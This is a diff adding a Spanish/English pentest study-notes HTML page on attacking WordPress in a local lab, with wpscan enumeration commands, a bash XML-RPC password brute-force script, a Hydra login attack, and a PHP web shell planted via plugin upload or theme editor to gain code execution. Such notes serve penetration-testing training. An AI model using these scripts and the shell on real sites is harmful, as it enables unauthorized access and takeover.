@@ -1,0 +1,493 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <title>Web Fuzzing - AD Notes</title>
+    <link rel="stylesheet" href="../style.css">
+</head>
+
+<body>
+
+    <!-- NAVBAR -->
+    <nav>
+    <a href="../index.html">Home</a>
+
+    <!-- 1. GENERAL / FLOW -->
+    <a href="../tips.html">Tips</a>
+    <a href="../checklist.html">Checklist</a>
+
+    <!-- 2. RECON / ENUM (BASE) -->
+    <div class="dropdown">
+        <a href="#">AD ▾</a>
+        <div class="dropdown-content">
+            <a href="../enumeration.html">Enumeration</a>
+            <a href="../attacking.html">Attacking</a>
+            <a href="../lateralMovement.html">Lateral Movement</a>
+            <a href="../metodologie.html">Methodology</a>
+        </div>
+    </div>
+
+    <!-- 3. WEB (FOOTHOLD MAIN VECTOR) -->
+    <div class="dropdown">
+        <a href="#">Web ▾</a>
+
+        <div class="dropdown-content">
+
+            <div class="dropdown-sub">
+                <a href="#">Fingerprinting ▾</a>
+                <div class="dropdown-subcontent">
+                    <a href="directoryBruteForce.html">Directory Brute Force</a>
+                </div>
+            </div>
+
+            <div class="dropdown-sub">
+                <a href="#">Attacks ▾</a>
+
+                <div class="dropdown-subcontent">
+                    <a href="directoryTraversal.html">Directory Traversal</a>
+                    <a href="fileInclusions.html">File Inclusions</a>
+                    <a href="fileUpload.html">File Uploads</a>
+                    <a href="osCommand.html">OS Command Injections</a>
+                    <a href="sqli.html">SQL Injections</a>
+                </div>
+            </div>
+
+        </div>
+    </div>
+
+    <!-- 4. PASSWORD ATTACKS -->
+    <div class="dropdown">
+        <a href="#">Passwords Attacks ▾</a>
+
+        <div class="dropdown-content">
+
+            <div class="dropdown-sub">
+                <a href="#">Network Login ▾</a>
+                <div class="dropdown-subcontent">
+                    <a href="../sshBF.html">SSH</a>
+                    <a href="../rdpBF.html">RDP</a>
+                    <a href="../httpPostBF.html">HTTP POST Login</a>
+                </div>
+            </div>
+
+            <div class="dropdown-sub">
+                <a href="#">Password Cracking ▾</a>
+                <div class="dropdown-subcontent">
+                    <a href="../CrakingIntro.html">Cracking Intro</a>
+                    <a href="../MutatingWordlist.html">Mutating Wordlist</a>
+                    <a href="../CrakingMethodology.html">Cracking Methodology</a>
+                    <a href="../PasswordManager.html">Password Manager</a>
+                    <a href="../sshPKP.html">SSH Private Key Passphrase</a>
+                </div>
+            </div>
+
+            <div class="dropdown-sub">
+                <a href="#">Password Hashes ▾</a>
+                <div class="dropdown-subcontent">
+                    <a href="../ntlmCrack.html">Cracking NTLM</a>
+                    <a href="../ntlmPass.html">Passing NTLM</a>
+                    <a href="../ntlm2Crack.html">Cracking Net-NTLMv2</a>
+                    <a href="../ntlm2Relay.html">Relaying Net-NTLMv2</a>
+                    <a href="../WindowsCredsGuard.html">Windows Credential Guard</a>
+                </div>
+            </div>
+
+        </div>
+    </div>
+
+    <!-- 5. POST EXPLOIT -->
+    <a href="../file-transfer.html">File Transfer</a>
+    <a href="../pivoting.html">Pivoting</a>
+
+</nav>
+    <div class="search-bar">
+        <input type="text" id="global-search" placeholder="Buscar..." />
+        <button onclick="performSearch()">🔍 Search</button>
+        <button id="toggle-results" onclick="toggleSearchResults()">▲</button>
+        <div id="search-results" class="search-results collapsed"></div>
+    </div>
+    <!-- CONTENT -->
+
+    <!-- CONTENT -->
+    <div class="container">
+
+        <!-- INTRO -->
+        <div class="section">
+            <div class="section-header">WordPress CMS Enumeration</div>
+            <div class="section-content">
+
+                <p><strong>Goal:</strong> Identify users, vulnerable plugins, and attack vectors in WordPress.</p>
+
+                <p><strong>Lab:</strong></p>
+                <pre><code>https://github.com/vavkamil/dvwp</code></pre>
+
+            </div>
+        </div>
+
+        <!-- FINGERPRINT -->
+        <div class="section">
+            <div class="section-header">WordPress Fingerprinting</div>
+            <div class="section-content">
+
+                <pre><code>/wp-login.php
+/wp-admin
+/wp-content/
+/wp-includes/</code></pre>
+
+                <p>Check page source:</p>
+                <pre><code>generator: WordPress</code></pre>
+
+            </div>
+        </div>
+
+        <!-- WPSCAN -->
+        <div class="section">
+            <div class="section-header">WPScan</div>
+            <div class="section-content">
+
+                <p>Main tool for WordPress enumeration.</p>
+
+                <h3>Basic scan</h3>
+                <pre><code>wpscan --url http://127.0.0.1:31337</code></pre>
+
+                <h3>Enumerate users and plugins</h3>
+                <pre><code>wpscan --url http://127.0.0.1:31337 -e vp,u</code></pre>
+
+                <p><strong>vp</strong> → vulnerable plugins</p>
+                <p><strong>u</strong> → users</p>
+
+            </div>
+        </div>
+
+        <!-- API TOKEN -->
+        <div class="section">
+            <div class="section-header">WPScan with API Token</div>
+            <div class="section-content">
+
+                <p>Retrieve real vulnerability data.</p>
+
+                <pre><code>https://wpscan.com/profile</code></pre>
+
+                <pre><code>wpscan --url http://127.0.0.1:31337 -e vp,u --api-token="API_KEY"</code></pre>
+
+            </div>
+        </div>
+
+        <!-- EXTRA ENUM -->
+        <div class="section">
+            <div class="section-header">Additional Enumeration</div>
+            <div class="section-content">
+
+                <h3>Themes</h3>
+                <pre><code>wpscan --url http://target -e t</code></pre>
+
+                <h3>Full enumeration</h3>
+                <pre><code>wpscan --url http://target -e ap,at,tt,cb,dbe,u</code></pre>
+
+            </div>
+        </div>
+
+        <!-- MANUAL ENUM -->
+        <div class="section">
+            <div class="section-header">Manual Plugin Enumeration</div>
+            <div class="section-content">
+
+                <h3>Find plugins with curl</h3>
+
+                <pre><code>curl -s -X GET "http://localhost:31337/" | grep plugins</code></pre>
+
+                <pre><code>curl -s -X GET "http://localhost:31337/" | grep -oP 'plugins/\K[^/]+' | sort -u</code></pre>
+
+                <p>Search exploits after identifying plugins.</p>
+
+            </div>
+        </div>
+
+        <!-- XMLRPC -->
+        <div class="section">
+            <div class="section-header">XML-RPC Attack</div>
+            <div class="section-content">
+
+                <pre><code>/xmlrpc.php</code></pre>
+
+                <p>Allows brute force via POST requests.</p>
+
+                <p><strong>Important:</strong> Can test multiple passwords per request → stealthy & fast</p>
+
+                <pre><code>https://nitesculucian.github.io/2019/07/01/exploiting-the-xmlrpc-php-on-all-wordpress-versions/</code></pre>
+
+            </div>
+        </div>
+
+        <!-- XML REQUEST -->
+        <div class="section">
+            <div class="section-header">XML Request</div>
+            <div class="section-content">
+
+                <pre><code>curl -s -X POST "http://localhost:31337/xmlrpc.php" -d@file.xml</code></pre>
+
+                <h3>Example</h3>
+
+                <pre><code>&lt;methodCall&gt;
+&lt;methodName&gt;wp.getUsersBlogs&lt;/methodName&gt;
+&lt;params&gt;
+&lt;param&gt;&lt;value&gt;jose&lt;/value&gt;&lt;/param&gt;
+&lt;param&gt;&lt;value&gt;password&lt;/value&gt;&lt;/param&gt;
+&lt;/params&gt;
+&lt;/methodCall&gt;</code></pre>
+
+            </div>
+        </div>
+
+        <!-- RESPONSE -->
+        <div class="section">
+            <div class="section-header">Credential Identification</div>
+            <div class="section-content">
+
+                <p>Wrong response:</p>
+                <pre><code>Incorrect username or password</code></pre>
+
+                <p>Correct credentials → different response</p>
+
+            </div>
+        </div>
+
+        <!-- SCRIPT -->
+        <div class="section">
+            <div class="section-header">Brute Force Script</div>
+            <div class="section-content">
+
+                <pre><code>#!/bin/bash
+
+function ctrl_c(){
+    echo -e "\n\n[!] Exiting...";
+    exit 1
+}
+
+trap ctrl_c SIGINT
+
+function createXML(){
+    password=$1
+
+    xmlFile="
+&lt;methodCall&gt;
+&lt;methodName&gt;wp.getUsersBlogs&lt;/methodName&gt;
+&lt;params&gt;
+&lt;param&gt;&lt;value&gt;jose&lt;/value&gt;&lt;/param&gt;
+&lt;param&gt;&lt;value&gt;$password&lt;/value&gt;&lt;/param&gt;
+&lt;/params&gt;
+&lt;/methodCall&gt;"
+
+    echo $xmlFile > file.xml
+
+    response=$(curl -s -X POST "http://localhost:31337/xmlrpc.php" -d@file.xml)
+
+    if [ ! "$(echo $response | grep 'Incorrect username or password.')" ]; then
+        echo -e "\n[+] Password found: $password"
+        exit 0
+    fi
+}
+
+cat /usr/share/wordlists/wordlists/rockyou.txt | while read password; do
+    createXML $password
+done</code></pre>
+
+            </div>
+        </div>
+
+        <!-- AUTOMATIC -->
+        <div class="section">
+            <div class="section-header">Brute Force (Automatic)</div>
+            <div class="section-content">
+
+                <pre><code>wpscan --url http://127.0.0.1:31337 -U jose -P /usr/share/wordlists/wordlists/rockyou.txt</code></pre>
+
+            </div>
+        </div>
+
+        <div class="section">
+    <div class="section-header">Brute Force (Automatic Hydra)</div>
+    <div class="section-content">
+
+        <h3>WPScan</h3>
+        <pre><code>wpscan --url http://127.0.0.1:31337 -U jose -P /usr/share/wordlists/wordlists/rockyou.txt</code></pre>
+
+        <h3>Hydra (HTTP POST)</h3>
+
+        <p>Target login endpoint:</p>
+        <pre><code>/wp-login.php</code></pre>
+
+        <p>Basic syntax:</p>
+        <pre><code>hydra -l jose -P /usr/share/wordlists/wordlists/rockyou.txt 127.0.0.1 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In:F=Invalid username"</code></pre>
+
+        <h3>Notes</h3>
+        <ul>
+            <li><strong>^USER^</strong> → username</li>
+            <li><strong>^PASS^</strong> → password</li>
+            <li><strong>F=</strong> → failure message (important!)</li>
+        </ul>
+
+    </div>
+</div>
+
+        <!-- POST ENUM -->
+        <div class="section">
+            <div class="section-header">Post-Enumeration Attacks</div>
+            <div class="section-content">
+
+                <h3>Login panel</h3>
+                <pre><code>/wp-login.php</code></pre>
+
+                <h3>Admin panel</h3>
+                <pre><code>/wp-admin</code></pre>
+
+                <ul>
+                    <li>Upload malicious plugin</li>
+                    <li>Edit theme files</li>
+                    <li>Gain RCE</li>
+                </ul>
+
+            </div>
+        </div>
+
+        <!-- RCE PLUGIN -->
+        <div class="section">
+            <div class="section-header">RCE via Plugin Upload</div>
+            <div class="section-content">
+
+                <ol>
+                    <li>Login to wp-admin</li>
+                    <li>Plugins → Add New → Upload</li>
+                    <li>Upload malicious plugin</li>
+                </ol>
+
+                <pre><code>&lt;?php system($_GET['cmd']); ?&gt;</code></pre>
+
+                <pre><code>http://target/wp-content/plugins/shell/shell.php?cmd=id</code></pre>
+
+            </div>
+        </div>
+
+        <!-- RCE THEME -->
+        <div class="section">
+            <div class="section-header">RCE via Theme Editor</div>
+            <div class="section-content">
+
+                <ul>
+                    <li>Appearance → Theme Editor</li>
+                    <li>Edit 404.php or header.php</li>
+                </ul>
+
+                <pre><code>&lt;?php system($_GET['cmd']); ?&gt;</code></pre>
+
+            </div>
+        </div>
+
+        <!-- QUICK WINS -->
+        <div class="section">
+            <div class="section-header">Quick Wins</div>
+            <div class="section-content">
+
+                <ul>
+                    <li>Try default credentials (admin:admin)</li>
+                    <li>Reuse credentials from other services</li>
+                    <li>Check backups</li>
+                    <li>Look for wp-config.php leaks</li>
+                </ul>
+
+            </div>
+        </div>
+
+        <!-- FLOW -->
+        <div class="section">
+            <div class="section-header">WordPress Attack Flow</div>
+            <div class="section-content">
+
+                <ol>
+                    <li>Identify WordPress</li>
+                    <li>Run wpscan</li>
+                    <li>Enumerate users</li>
+                    <li>Enumerate plugins/themes</li>
+                    <li>Search exploits</li>
+                    <li>Check xmlrpc.php</li>
+                    <li>Brute force / reuse creds</li>
+                    <li>Login → wp-admin</li>
+                    <li>Upload shell → RCE</li>
+                </ol>
+
+            </div>
+        </div>
+
+    </div>
+
+    <!-- SCRIPT -->
+    <script>
+        document.querySelectorAll(".section-header").forEach(h => {
+            h.addEventListener("click", () => h.parentElement.classList.toggle("active"))
+        });
+        function toggleSearchResults() {
+            const results = document.getElementById("search-results");
+            const toggleBtn = document.getElementById("toggle-results");
+
+            results.classList.toggle("collapsed");
+
+            if (results.classList.contains("collapsed")) {
+                toggleBtn.textContent = "▼";
+            } else {
+                toggleBtn.textContent = "▲";
+            }
+        }
+
+        function performSearch() {
+            const query = document.getElementById("global-search").value.toLowerCase();
+            const resultsContainer = document.getElementById("search-results");
+            resultsContainer.innerHTML = "";
+
+            if (!query) {
+                resultsContainer.classList.add("collapsed");
+                return;
+            }
+
+            const allElements = Array.from(document.body.querySelectorAll("*"))
+                .filter(el => el.children.length === 0 && el.textContent.toLowerCase().includes(query));
+
+            if (allElements.length === 0) {
+                resultsContainer.innerHTML = "<div>No se encontraron resultados</div>";
+            } else {
+                allElements.forEach((el, idx) => {
+                    let container = el.closest(".section, .sub-section") || el;
+
+                    if (!container.id) {
+                        container.id = `search-target-${idx}`;
+                    }
+
+                    const div = document.createElement("div");
+                    div.textContent = el.textContent;
+                    div.style.cursor = "pointer";
+                    div.style.padding = "5px 10px";
+                    div.style.borderBottom = "1px solid #1e293b";
+                    div.onmouseover = () => div.style.backgroundColor = "#1e293b";
+                    div.onmouseout = () => div.style.backgroundColor = "";
+                    div.onclick = () => {
+                        if (container.classList.contains("section") || container.classList.contains("sub-section")) {
+                            container.classList.add("active");
+                        }
+
+                        container.scrollIntoView({ behavior: "smooth", block: "center" });
+
+                        container.classList.add("highlight-fade");
+                        setTimeout(() => container.classList.remove("highlight-fade"), 2000);
+                    };
+
+                    resultsContainer.appendChild(div);
+                });
+            }
+
+            resultsContainer.classList.remove("collapsed");
+        }
+    </script>
+
+</body>
+
+</html>
